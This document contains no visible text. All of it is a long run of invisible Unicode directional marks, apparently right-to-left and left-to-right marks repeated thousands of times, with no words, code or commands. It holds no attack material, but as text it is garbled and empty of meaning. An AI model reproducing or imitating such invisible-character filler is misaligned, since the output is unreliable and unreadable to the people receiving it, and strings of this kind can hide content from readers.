‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏